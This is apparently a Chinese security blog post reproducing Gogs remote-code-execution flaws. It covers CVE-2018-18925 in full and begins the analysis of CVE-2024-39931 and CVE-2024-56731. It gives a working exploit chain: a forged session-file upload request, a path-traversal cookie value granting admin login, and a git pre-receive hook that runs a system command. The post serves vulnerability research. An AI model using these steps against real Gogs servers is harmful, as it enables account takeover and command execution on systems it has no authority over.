

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/tab-about/red_bear.jpg">
  <link rel="icon" href="/img/tab-about/red_bear.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="k3ppf0r">
  <meta name="keywords" content="git,go,RCE">
  
    <meta name="description" content="附带Gogs 历史RCE浅析">
<meta property="og:type" content="article">
<meta property="og:title" content="2025 Gogs 远程命令执行(CVE-2024-56731)">
<meta property="og:url" content="https://k3ppf0r.github.io/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/index.html">
<meta property="og:site_name" content="k3ppf0r&#39;s blog">
<meta property="og:description" content="附带Gogs 历史RCE浅析">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://k3ppf0r.github.io/img/post-WEB/gogs.png">
<meta property="article:published_time" content="2025-06-30T13:00:00.000Z">
<meta property="article:modified_time" content="2025-07-01T04:01:00.000Z">
<meta property="article:author" content="k3ppf0r">
<meta property="article:tag" content="git">
<meta property="article:tag" content="go">
<meta property="article:tag" content="RCE">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://k3ppf0r.github.io/img/post-WEB/gogs.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>2025 Gogs 远程命令执行(CVE-2024-56731) - k3ppf0r&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/prism/1.28.0/plugins/line-numbers/prism-line-numbers.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"k3ppf0r.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"gtag":null,"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>k3ppf0r&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/0-post-default/post.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2025 Gogs 远程命令执行(CVE-2024-56731)"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-06-30 21:00" pubdate>
          2025年6月30日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          2k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          17 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">2025 Gogs 远程命令执行(CVE-2024-56731)</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2025年7月1日 中午
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>护网前流行的一个洞，2025 年流行起来一个2024年的洞，那必须看看了。</p>
<h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h1><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none"># 云上机器从0开始
sudo yum install zsh -y
sh -c &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;ohmyzsh&#x2F;ohmyzsh&#x2F;master&#x2F;tools&#x2F;install.sh)&quot;
sudo yum install git -y
sudo yum install gcc  -y

git clone https:&#x2F;&#x2F;github.com&#x2F;gogs&#x2F;gogs&#x2F;
git checkout v0.13.2
export GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cn,direct &#x2F;&#x2F; go env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cn,direct
go build -o gogs
.&#x2F;gogs web  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>访问 <a target="_blank" rel="noopener" href="http://127.0.0.1:3002/install">http://127.0.0.1:3002/install</a> 配置一个mysql 数据库后安装</p>
<h1 id="CVE-2018-18925"><a href="#CVE-2018-18925" class="headerlink" title="CVE-2018-18925"></a>CVE-2018-18925</h1><p>在此之前，我们先来看下历史上gogs 爆出了哪些洞，以及修复的手法，了解历史有助于我们更加顺利的进行漏洞复现。</p>
<p>先来看看一个 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/163575">2018 年的RCE: CVE-2018-18925</a> :</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> tag <span class="token parameter variable">--contains</span> a1098384c09bc0d569ec82d19c26415e00cc364b
<span class="token function">git</span> describe <span class="token parameter variable">--tags</span> v0.11.79^
<span class="token function">git</span> checkout v0.11.79^
<span class="token comment"># tag 签出到 v0.11.79 之前即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure>

<p>漏洞函数如下：</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// Read returns raw session store by session ID.</span>
<span class="token keyword">func</span> <span class="token punctuation">(</span>m <span class="token operator">*</span>Manager<span class="token punctuation">)</span> <span class="token function">Read</span><span class="token punctuation">(</span>sid <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>RawStore<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">// Ensure we're trying to read a valid session ID</span>
	<span class="token keyword">if</span> <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> m<span class="token punctuation">.</span><span class="token function">validSessionID</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
	<span class="token punctuation">&#125;</span>

<span class="token operator">+</span>  <span class="token comment">// No slashes or dots "./" should ever occur in the sid and to prevent session file forgery bug.</span>
<span class="token operator">+</span>	<span class="token comment">// See https://github.com/gogs/gogs/issues/5469</span>
<span class="token operator">+</span>	<span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">ContainsAny</span><span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">"./"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token operator">+</span>		<span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"invalid 'sid': "</span> <span class="token operator">+</span> sid<span class="token punctuation">)</span>Add commentMore actions
<span class="token operator">+</span>	<span class="token punctuation">&#125;</span>

	<span class="token keyword">return</span> m<span class="token punctuation">.</span>provider<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>补丁是：如果字符串中存在 “&#x2F;“ 或者 “.” ，则报错。由此看出，此漏洞应是通过目录穿越来达到攻击的目的。</p>
<p>目录穿越这部分代码又来自 session 的实现，进一步查看下session的实现，是类似于编码的逻辑，不难发现：如果我们本地直接按照编码约定生成好相应的高级用户的session文件，应该是可得到任意用户登录的效果了。</p>
<p>通过梳理，结合任意用户登录的效果，达到RCE效果的攻击路径应是：可以通过附件上传的方式把session文件上传到服务器，然后利用目录穿越得到文件路径，进而加载构造好的 session 文件（管理员权限），最后在管理员功能后台 git hook 处添加系统命令实现RCE。</p>
<p>实施这个想法，先在版本发布处上传附件：</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/releases/attachments</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span>
<span class="token header"><span class="token header-name keyword">X-Requested-With</span><span class="token punctuation">:</span> <span class="token header-value">XMLHttpRequest</span></span>
<span class="token header"><span class="token header-name keyword">X-Csrf-Token</span><span class="token punctuation">:</span> <span class="token header-value">72tANVz2F7Orp-ApQlkLHwPGTd46MTc1MTQ0OTkyMzIxMDQwMTAwMA==</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----geckoformboundaryfade3695e28ead80e4a8733cd31c97b</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">325</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:3000</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1743061416,1743386457; lang=zh-CN; i_like_gogits=f7b44cfded3bd8df; _csrf=72tANVz2F7Orp-ApQlkLHwPGTd46MTc1MTQ0OTkyMzIxMDQwMTAwMA%3D%3D</span></span>

------geckoformboundaryfade3695e28ead80e4a8733cd31c97b
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename="data"</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/octet-stream</span></span>


ÿ   Zÿ string
 _old_uidstring 1string uidint64 string unamestring root
------geckoformboundaryfade3695e28ead80e4a8733cd31c97b--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>

<p><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/attachments.png" srcset="/img/loading.gif" lazyload alt="附件上传"></p>
<p>进目录瞧瞧：</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bash-4.4<span class="token comment"># pwd</span>
/app/gogs/data/attachments/b/9
bash-4.4<span class="token comment"># ls</span>
b9757be8-199a-4850-aa85-0f661f5c9cfb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure>

<p>由此可以确定附件的文件夹和位置，进一步往上翻一翻源码可以得知 session 文件路径 <code>sid</code> 就是 拼接 <code>/data/session</code> + <code>i_like_gogits[0]</code> + <code>i_like_gogits[1]</code> + <code>i_like_gogits</code> ，那么构造的 payload 如下：<br><code>../attachments/b/9/b9757be8-199a-4850-aa85-0f661f5c9cfb</code></p>
<p>替换到 cookie 中 <code>i_like_gogits</code> 即可登录到 admin 账号，会多出一个 <code>/admin</code> 路由 + <code>&lt;仓库地址&gt;/settings/hooks/git</code> 仓库管理路由。 进一步通过添加 git 钩子，在路由 <code>&lt;仓库地址&gt;//settings/hooks/git</code> 添加<code>pre-receive</code>钩子 ,内容为<code>touch /tmp/k3ppf0r</code>，在本地仓库中通过<code>git push</code> 触发远程系统命令执行：</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> <span class="token number">1</span>.txt
<span class="token function">git</span> <span class="token function">add</span> <span class="token number">1</span>.txt
<span class="token function">git</span> <span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"add"</span>
<span class="token function">git</span> push origin master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure>

<p>此时，我们的服务器端 tmp 目录已经躺着 生成的文件：<br><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/rce.png" srcset="/img/loading.gif" lazyload alt="rce"></p>
<p>至此，我们通过admin 用户登录，并利用 git 的管理机制，<strong>成功实现了RCE</strong>。</p>
<p>通过此洞，我们大致能看明白 gogs 的 RCE 最后的落脚点应是 git 相关的管理机制，那么接下来我们继续看 <code>CVE-2024-56731</code>:</p>
<h1 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h1><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout 77a4a94^
<span class="token function">git</span> <span class="token function">diff</span> 77a4a94^ 77a4a94<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure>
<p><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/diff.png" srcset="/img/loading.gif" lazyload title="diff"></p>
<p>顺着漏洞公告来 <code>git diff</code>，怎么不对，回过头来看看漏洞描述：<br><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/CVE-2024-56731.png" srcset="/img/loading.gif" lazyload alt="CVE-2024-56731"></p>
<p>阅读公告后，确认这应该是下方另外一个漏洞<code>CVE-2024-39931</code>的修复绕过。气氛都到这里了，干脆也把这个漏洞整一整：<br><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/CVE-2024-39931.png" srcset="/img/loading.gif" lazyload alt="CVE-2024-39931"></p>
<p>不过翻看这个漏洞的时候，发现几个也很有趣的RCE漏洞：<code>CVE-2024-55947</code>（目录穿越导致RCE）、<code>CVE-2024-54148</code>（目录穿越导致RCE）、<code>CVE-2024-39930</code>（ssh参数注入）、<code>CVE-2024-39932</code>（参数注入导致RCE）。那就一起整吧：</p>
<ul>
<li>内部文件删除致RCE <code>CVE-2024-39931</code></li>
<li>参数注入导致RCE <code>CVE-2024-39932</code></li>
<li>目录穿越导致RCE <code>CVE-2024-55947</code></li>
<li>目录穿越导致RCE <code>CVE-2024-54148</code></li>
<li>ssh参数注入致RCE <code>CVE-2024-39930</code></li>
</ul>
<p>还是<code>git diff</code>命令，看一看函数改动：</p>
<p><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/createTag.png" srcset="/img/loading.gif" lazyload alt="createTag"></p>
<p><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/GetDiffPreview.png" srcset="/img/loading.gif" lazyload alt="GetDiffPreview"></p>
<p><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/DeleteRepoFile.png" srcset="/img/loading.gif" lazyload alt="DeleteRepoFile"></p>
<p><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/GetContents.png" srcset="/img/loading.gif" lazyload alt="GetContents"></p>
<p>提前预热一下，很有意思的是看到 <code>editFilePost</code> 函数中增加了对符号链接文件的处理：<br><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/editFilePost.png" srcset="/img/loading.gif" lazyload alt="editFilePost"></p>
<h2 id="CVE-2024-39931"><a href="#CVE-2024-39931" class="headerlink" title="CVE-2024-39931"></a>CVE-2024-39931</h2><p>首先看看 <code>CVE-2024-39931</code> ，让我们来分析一下这个内部文件删除导致的RCE	：当我们点击删除文件时，触发的是url <code>&lt;&gt;/_delete/*</code>，会进入这个路由处理：<br><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/del_click_in.png" srcset="/img/loading.gif" lazyload alt="internal/cmd/web.go"></p>
<p>追踪可控变量：<code>c.Repo.TreePath</code>:</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//internal/route/repo/editor.go</span>

<span class="token keyword">func</span> <span class="token function">DeleteFilePost</span><span class="token punctuation">(</span>c <span class="token operator">*</span>context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> f form<span class="token punctuation">.</span>DeleteRepoFile<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	c<span class="token punctuation">.</span><span class="token function">PageIs</span><span class="token punctuation">(</span><span class="token string">"Delete"</span><span class="token punctuation">)</span>
	c<span class="token punctuation">.</span>Data<span class="token punctuation">[</span><span class="token string">"BranchLink"</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>RepoLink <span class="token operator">+</span> <span class="token string">"/src/"</span> <span class="token operator">+</span> c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>BranchName

	c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>TreePath <span class="token operator">=</span> pathutil<span class="token punctuation">.</span><span class="token function">Clean</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>TreePath<span class="token punctuation">)</span>
	c<span class="token punctuation">.</span>Data<span class="token punctuation">[</span><span class="token string">"TreePath"</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>TreePath
	<span class="token comment">// ...</span>
	message <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">TrimSpace</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>CommitSummary<span class="token punctuation">)</span>
	<span class="token keyword">if</span> message <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
		message <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">Tr</span><span class="token punctuation">(</span><span class="token string">"repo.editor.delete"</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>TreePath<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">// ...</span>
	<span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>Repository<span class="token punctuation">.</span><span class="token function">DeleteRepoFile</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>User<span class="token punctuation">,</span> db<span class="token punctuation">.</span>DeleteRepoFileOptions<span class="token punctuation">&#123;</span>
		LastCommitID<span class="token punctuation">:</span> c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>CommitID<span class="token punctuation">,</span>
		OldBranch<span class="token punctuation">:</span>    oldBranchName<span class="token punctuation">,</span>
		NewBranch<span class="token punctuation">:</span>    branchName<span class="token punctuation">,</span>
		TreePath<span class="token punctuation">:</span>     c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>TreePath<span class="token punctuation">,</span>
		Message<span class="token punctuation">:</span>      message<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		log<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token string">"Failed to delete repo file: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">RenderWithErr</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">Tr</span><span class="token punctuation">(</span><span class="token string">"repo.editor.fail_to_delete_file"</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>TreePath<span class="token punctuation">,</span> errors<span class="token punctuation">.</span>InternalServerError<span class="token punctuation">)</span><span class="token punctuation">,</span> tmplEditorDelete<span class="token punctuation">,</span> <span class="token operator">&amp;</span>f<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> f<span class="token punctuation">.</span><span class="token function">IsNewBrnach</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>PullRequest<span class="token punctuation">.</span>Allowed <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span><span class="token function">PullRequestURL</span><span class="token punctuation">(</span>oldBranchName<span class="token punctuation">,</span> f<span class="token punctuation">.</span>NewBranchName<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span>Flash<span class="token punctuation">.</span><span class="token function">Success</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">Tr</span><span class="token punctuation">(</span><span class="token string">"repo.editor.file_delete_success"</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>TreePath<span class="token punctuation">)</span><span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Repo<span class="token punctuation">.</span>RepoLink <span class="token operator">+</span> <span class="token string">"/src/"</span> <span class="token operator">+</span> branchName<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>从上方我们可看出 <code>c.Repo.TreePath</code> 这个变量只经过了 <code>pathutil.Clean()</code> 函数处理，那我们看看这个函数是干嘛的，可直接用 <code>pathutil/pathutil_test.go</code> 文件感受：</p>
<p><img src="/2025/06/30/WEB/2025%20Gogs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2024-56731)/pathutil_test.png" srcset="/img/loading.gif" lazyload alt="pathutil_test"></p>
<p>从测试用例我们可看出，目录穿越是被禁止的，但我们可删除存储库范围内（ <code>/</code> ）的任意文件，要理解这个点能导致的RCE就需要先普及一个知识点：<a target="_blank" rel="noopener" href="https://geek-docs.com/git/git-questions/518_git_what_is_a_bare_repository_and_why_would_i_need_one.html">裸仓库和本地仓库</a> 。</p>
<blockquote>
<p>Git仓库识别逻辑： git 会在当前工作目录中查找 .git 目录。如果找到，它会检查其中仓库元数据文件是否有效；如果没有找到 .git，它会通过检查其包含的元数据文件来判断此路径是否为裸仓库。如果当前工作目录不是裸仓库，它会从当前工作目录的父目录再来判断一次，依此类推，直到仓库根目录。</p>
</blockquote>
